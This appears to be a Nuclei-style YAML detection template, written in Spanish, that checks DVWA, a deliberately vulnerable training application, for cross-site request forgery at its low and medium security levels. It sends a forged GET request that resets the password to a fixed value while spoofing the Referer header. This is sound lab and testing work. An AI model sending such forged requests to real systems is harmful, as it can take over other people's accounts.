id: CSRF_VALIDADO
info:
  name: PRUEBAS CSRF DVWA
  author: Fabian Morales
  severity: high
  description: |
    Detecta CSRF en DVWA para todos los niveles de seguridad:
    - Low: Sin protecci√≥n
    - Medium: Verifica Referer
  tags: CSRF, DVWA

variables:
  new_password: "asdasdasd."

requests:
  - method: GET
    path:
      - "{{BaseURL}}"

  - method: GET
    path:
      # Low y medium
      - "{{BaseURL}}/?password_new={{new_password}}&password_conf={{new_password}}&Change=Change"
    headers:
      Referer: "{{target_url}}"
    
    matchers:
      - type: regex
        part: body
        regex:
          - "Password Changed"
          - "password has been changed"

